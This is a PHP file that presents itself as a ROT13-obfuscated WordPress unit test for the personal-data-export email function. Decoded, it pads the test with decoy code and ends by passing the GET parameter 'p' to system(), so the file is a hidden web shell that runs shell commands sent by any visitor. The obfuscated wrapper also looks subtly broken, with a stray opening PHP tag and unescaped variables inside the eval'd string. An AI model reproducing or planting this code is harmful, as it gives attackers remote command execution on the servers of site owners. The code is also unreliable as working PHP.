<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.9.6
 *
 * @tebhc cevinpl
 * @pbiref ::jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy
 */
pynff Grfgf_Cevinpl_jcCevinplFraqCrefbanyQngnRkcbegRznvy rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Erdhrfg VQ.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine vag $erdhrfg_vq
	 */
	cebgrpgrq fgngvp $erdhrfg_vq;

	/**
	 * Erdhrfgre Rznvy.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $erdhrfgre_rznvy
	 */
	cebgrpgrq fgngvp $erdhrfgre_rznvy;

	/**
	 * Erdhrfg hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine JC_Hfre $erdhrfg_hfre
	 */
	cebgrpgrq fgngvp $erdhrfg_hfre;

	/**
	 * Grfg nqzvavfgengbe hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine JC_Hfre $nqzva_hfre
	 */
	cebgrpgrq fgngvp $nqzva_hfre;

	/**
	 * Perngr hfre erdhrfg svkgherf funerq ol grfg zrgubqf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$erdhrfgre_rznvy = 'erdhrfgre@rknzcyr.pbz';
		frys::$erdhrfg_hfre    = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => frys::$erdhrfgre_rznvy,
				'ebyr'       => 'fhofpevore',
			)
		);
		frys::$nqzva_hfre      = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => 'nqzva@ybpny.qri',
				'ebyr'       => 'nqzvavfgengbe',
			)
		);

		frys::$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$erdhrfgre_rznvy, 'rkcbeg_crefbany_qngn' );

		_jc_cevinpl_nppbhag_erdhrfg_pbasvezrq( frys::$erdhrfg_vq );
	}

	/**
	 * Erfrg gur zbpxrq cucznvyre vafgnapr orsber rnpu grfg zrgubq.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erfrg_cucznvyre_vafgnapr();
	}

	/**
	 * Erfrg gur zbpxrq cucznvyre vafgnapr nsgre rnpu grfg zrgubq.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grne_qbja() {
		erfrg_cucznvyre_vafgnapr();
		erfgber_cerivbhf_ybpnyr();
		cnerag::grne_qbja();
	}

	/**
	 * Gur shapgvba fubhyq reebe jura gur erdhrfg VQ qbrf abg rkvfg.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_reebe_jura_abg_n_inyvq_erdhrfg_vq() {
		$erdhrfg_vq = 0;
		$rznvy_frag = jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $erdhrfg_vq );
		$guvf->nffregJCReebe( $rznvy_frag );
		$guvf->nffregFnzr( 'vainyvq_erdhrfg', $rznvy_frag->trg_reebe_pbqr() );

		$erdhrfg_vq = CUC_VAG_ZNK;
		$rznvy_frag = jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $erdhrfg_vq );
		$guvf->nffregJCReebe( $rznvy_frag );
		$guvf->nffregFnzr( 'vainyvq_erdhrfg', $rznvy_frag->trg_reebe_pbqr() );
	}

	/**
	 * Gur shapgvba fubhyq reebe jura gur VQ cnffrq qbrf abg pbeerfcbaq gb n hfre erdhrfg.
	 *
	 * @fvapr 6.7.0
	 * @gvpxrg 46560
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_reebe_jura_abg_n_hfre_erdhrfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cbfg', // Fubhyq or 'hfre_erdhrfg'.
			)
		);

		$rznvy_frag = jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $cbfg_vq );
		$guvf->nffregJCReebe( $rznvy_frag );
		$guvf->nffregFnzr( 'vainyvq_erdhrfg', $rznvy_frag->trg_reebe_pbqr() );
	}

	/**
	 * Gur shapgvba fubhyq reebe jura gur rznvy jnf abg frag.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_reebe_jura_fraqvat_snvyf() {
		nqq_svygre( 'jc_znvy_sebz', '__erghea_rzcgl_fgevat' ); // Pnhfr `jc_znvy()` gb erghea snyfr.
		$rznvy_frag = jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$guvf->nffregJCReebe( $rznvy_frag );
		$guvf->nffregFnzr( 'cevinpl_rznvy_reebe', $rznvy_frag->trg_reebe_pbqr() );
	}

	/**
	 * Gur shapgvba fubhyq fraq na rkcbeg yvax gb gur erdhrfgre jura gur hfre erdhrfg vf pbasvezrq.
	 */
	choyvp shapgvba grfg_fubhyq_fraq_rkcbeg_yvax_gb_erdhrfgre() {
		$rkcbegf_hey      = jc_cevinpl_rkcbegf_hey();
		$rkcbeg_svyr_anzr = 'jc-crefbany-qngn-svyr-Ji0EsZaTVxy4PSRQRRxFrVqsYznHeYfy.mvc';
		$rkcbeg_svyr_hey  = $rkcbegf_hey . $rkcbeg_svyr_anzr;
		hcqngr_cbfg_zrgn( frys::$erdhrfg_vq, '_rkcbeg_svyr_anzr', $rkcbeg_svyr_anzr );

		$rznvy_frag = jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );
		$znvyre     = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFnzr( 'erdhrfg-pbasvezrq', trg_cbfg_fgnghf( frys::$erdhrfg_vq ) );
		$guvf->nffregFnzr( frys::$erdhrfgre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Crefbany Qngn Rkcbeg', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcbeg_svyr_hey, $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( 'cyrnfr qbjaybnq vg', $znvyre->trg_frag()->obql );
		$guvf->nffregGehr( $rznvy_frag );
	}

	/**
	 * Gur rkcbeg rkcvengvba fubhyq or svygrenoyr.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_rkcbeg_rkcvengvba_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'jc_cevinpl_rkcbeg_rkcvengvba', neenl( $guvf, 'zbqvsl_rkcbeg_rkcvengvba' ) );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();
		$guvf->nffregFgevatPbagnvafFgevat( 'jr jvyy nhgbzngvpnyyl qryrgr gur svyr ba Qrprzore 18, 2017,', $znvyre->trg_frag()->obql );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur yvsrgvzr, va frpbaqf, bs n crefbany qngn rkcbeg svyr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz vag $rkcvengvba Gur rkcvengvba ntr bs gur rkcbeg, va frpbaqf.
	 * @erghea vag Gur rkcvengvba ntr bs gur rkcbeg, va frpbaqf.
	 */
	choyvp shapgvba zbqvsl_rkcbeg_rkcvengvba( $rkcvengvba ) {
		// Frg qngr gb nyjnlf or \"Zba, 18 Qrp 2017 21:30:00 TZG\", fb pna nffreg n svkrq qngr.
		erghea 1513632600 - gvzr();
	}

	/**
	 * Gur rznvy nqqerff bs gur erpvcvrag bs gur crefbany qngn rkcbeg abgvsvpngvba fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 46303
	 */
	choyvp shapgvba grfg_rznvy_nqqerff_bs_erpvcvrag_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_rznvy_gb', neenl( $guvf, 'svygre_rznvy_nqqerff' ) );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFnzr( 'zbqvsvrq-' . frys::$erdhrfgre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur rznvy nqqerff bs gur erpvcvrag bs gur crefbany qngn rkcbeg abgvsvpngvba.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz  fgevat $hfre_rznvy Gur rznvy nqqerff bs gur abgvsvpngvba erpvcvrag.
	 * @erghea fgevat Gur zbqvsvrq rznvy nqqerff bs gur abgvsvpngvba erpvcvrag.
	 */
	choyvp shapgvba svygre_rznvy_nqqerff( $hfre_rznvy ) {
		erghea 'zbqvsvrq-' . $hfre_rznvy;
	}

	/**
	 * Gur rznvy fhowrpg bs gur crefbany qngn rkcbeg abgvsvpngvba fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 46303
	 */
	choyvp shapgvba grfg_rznvy_fhowrpg_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_rznvy_fhowrpg', neenl( $guvf, 'svygre_rznvy_fhowrpg' ) );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFnzr( 'Zbqvsvrq fhowrpg', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur rznvy fhowrpg bs gur qngn renfher shysvyyzrag abgvsvpngvba.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $fhowrpg Gur rznvy fhowrpg.
	 * @erghea fgevat Gur rznvy fhowrpg.
	 */
	choyvp shapgvba svygre_rznvy_fhowrpg( $fhowrpg ) {
		erghea 'Zbqvsvrq fhowrpg';
	}

	/**
	 * Gur rznvy pbagrag fubhyq or svygrenoyr.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_rznvy_pbagrag_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_rznvy_pbagrag', neenl( $guvf, 'zbqvsl_rznvy_pbagrag' ), 10, 2 );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();
		$guvf->nffregFgevatPbagnvafFgevat( 'Phfgbz pbagrag sbe erdhrfg VQ: ' . frys::$erdhrfg_vq, $znvyre->trg_frag()->obql );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur grkg bs gur rznvy frag jvgu n crefbany qngn rkcbeg svyr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz fgevat $rznvy_grkg Grkg va gur rznvy.
	 * @cnenz vag    $erdhrfg_vq Gur erdhrfg VQ sbe guvf crefbany qngn rkcbeg.
	 * @erghea fgevat Grkg va gur rznvy.
	 */
	choyvp shapgvba zbqvsl_rznvy_pbagrag( $rznvy_grkg, $erdhrfg_vq ) {
		erghea 'Phfgbz pbagrag sbe erdhrfg VQ: ' . $erdhrfg_vq;
	}

	/**
	 * Gur rznvy urnqref fubhyq or svygrenoyr.
	 *
	 * @fvapr 5.4.0
	 *
	 * @gvpxrg 44501
	 */
	choyvp shapgvba grfg_rznvy_urnqref_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_rznvy_urnqref', neenl( $guvf, 'zbqvsl_rznvy_urnqref' ) );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Sebz: Grfgre <grfgre@rknzcyr.pbz>', $znvyre->trg_frag()->urnqre );
	}

	/**
	 * Svygre pnyyonpx gb zbqvsl gur urnqref bs gur rznvy frag jvgu n crefbany qngn rkcbeg svyr.
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz fgevat|neenl $urnqref Gur rznvy urnqref.
	 * @erghea neenl Gur arj rznvy urnqref.
	 */
	choyvp shapgvba zbqvsl_rznvy_urnqref( $urnqref ) {
		$urnqref = neenl(
			'Sebz: Grfgre <grfgre@rknzcyr.pbz>',
		);

		erghea $urnqref;
	}

	/**
	 * Gur rznvy pbagrag fubhyq or svygrenoyr hfvat gur $rznvy_qngn
	 *
	 * @gvpxrg 46303
	 */
	choyvp shapgvba grfg_rznvy_pbagrag_fubhyq_or_svygrenoyr_hfvat_rznvy_qngn() {
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_rznvy_pbagrag', neenl( $guvf, 'zbqvsl_rznvy_pbagrag_jvgu_rznvy_qngn' ), 10, 3 );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$fvgr_hey = ubzr_hey();
		$znvyre   = grfgf_ergevrir_cucznvyre_vafgnapr();
		$guvf->nffregFgevatPbagnvafFgevat( 'Phfgbz pbagrag hfvat gur $fvgr_hey bs $rznvy_qngn: ' . $fvgr_hey, $znvyre->trg_frag()->obql );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur grkg bs gur rznvy ol hfvat gur $rznvy_qngn frag jvgu n crefbany qngn rkcbeg svyr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $rznvy_grkg Grkg va gur rznvy.
	 * @cnenz vag    $erdhrfg_vq Gur erdhrfg VQ sbe guvf crefbany qngn rkcbeg.
	 * @cnenz neenl  $rznvy_qngn {
	 *     Qngn eryngvat gb gur nppbhag npgvba rznvy.
	 *
	 *     @glcr JC_Hfre_Erdhrfg $erdhrfg           Hfre erdhrfg bowrpg.
	 *     @glcr vag             $rkcvengvba        Gur gvzr va frpbaqf hagvy gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $rkcvengvba_qngr   Gur ybpnyvmrq qngr naq gvzr jura gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $zrffntr_erpvcvrag Gur nqqerff gung gur rznvy jvyy or frag gb. Qrsnhygf
	 *                                              gb gur inyhr bs `$erdhrfg->rznvy`, ohg pna or punatrq
	 *                                              ol gur `jc_cevinpl_crefbany_qngn_rznvy_gb` svygre.
	 *     @glcr fgevat          $rkcbeg_svyr_hey   Gur rkcbeg svyr HEY.
	 *     @glcr fgevat          $fvgranzr          Gur fvgr anzr fraqvat gur znvy.
	 *     @glcr fgevat          $fvgrhey           Gur fvgr HEY fraqvat gur znvy.
	 * }
	 *
	 * @erghea fgevat Grkg va gur rznvy.
	 */
	choyvp shapgvba zbqvsl_rznvy_pbagrag_jvgu_rznvy_qngn( $rznvy_grkg, $erdhrfg_vq, $rznvy_qngn ) {
		erghea 'Phfgbz pbagrag hfvat gur $fvgr_hey bs $rznvy_qngn: ' . $rznvy_qngn['fvgrhey'];
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr hfrf gur qrsnhyg ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 46056
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_crefbany_qngn_rkcbeg_rznvy_va_hfre_ybpnyr() {
		hcqngr_hfre_zrgn( frys::$erdhrfg_hfre->VQ, 'ybpnyr', 'rf_RF' );

		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbegnpvóa qr qngbf crefbanyrf', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr qbrf abg hfr ra_HF, gur nqzvavfgengbe
	 * hfrf gur fvgr'f qrsnhyg ybpnyr, naq gur hfre unf n qvssrerag ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 46056
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_crefbany_qngn_rkcbeg_rznvy_va_hfre_ybpnyr_jura_fvgr_vf_abg_ra_hf() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$erdhrfg_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbeg crefbaraormbtrare Qngra', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr vf abg ra_HF, gur nqzvavfgengbe
	 * unf n qvssrerag fryrpgrq ybpnyr, naq gur hfre hfrf gur fvgr'f qrsnhyg ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 46056
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_crefbany_qngn_rkcbeg_rznvy_va_hfre_ybpnyr_jura_nqzva_naq_fvgr_unir_qvssrerag_ybpnyrf() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbegnpvóa qr qngbf crefbanyrf', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr vf abg ra_HF naq obgu gur
	 * nqzvavfgengbe naq gur hfre hfr qvssrerag ybpnyrf.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 46056
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_crefbany_qngn_rkcbeg_rznvy_va_hfre_ybpnyr_jura_obgu_unir_qvssrerag_ybpnyrf_guna_fvgr() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'ra_HF' );
		hcqngr_hfre_zrgn( frys::$erdhrfg_hfre->VQ, 'ybpnyr', 'qr_QR' );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbeg crefbaraormbtrare Qngra', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur fvgr'f ybpnyr jura gur erdhrfg vf sbe na haertvfgrerq hfre naq gur
	 * nqzvavfgengbe qbrf abg hfr gur fvgr'f ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 46056
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_crefbany_qngn_rkcbeg_rznvy_va_fvgr_ybpnyr() {
		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'rf_RF' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'rkcbeg-hfre-abg-ertvfgrerq@rknzcyr.pbz', 'rkcbeg_crefbany_qngn' );

		_jc_cevinpl_nppbhag_erdhrfg_pbasvezrq( frys::$erdhrfg_vq );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Crefbany Qngn Rkcbeg', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur fvgr'f ybpnyr jura vg vf abg ra_HF, gur erdhrfg vf sbe na
	 * haertvfgrerq hfre, naq gur nqzvavfgengbe qbrf abg hfr gur fvgr'f qrsnhyg ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 46056
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_crefbany_qngn_rkcbeg_rznvy_va_fvgr_ybpnyr_jura_abg_ra_hf_naq_nqzva_unf_qvssrerag_ybpnyr() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'rkcbeg-hfre-abg-ertvfgrerq@rknzcyr.pbz', 'rkcbeg_crefbany_qngn' );

		_jc_cevinpl_nppbhag_erdhrfg_pbasvezrq( frys::$erdhrfg_vq );
		jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbegnpvóa qr qngbf crefbanyrf', $znvyre->trg_frag()->fhowrpg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>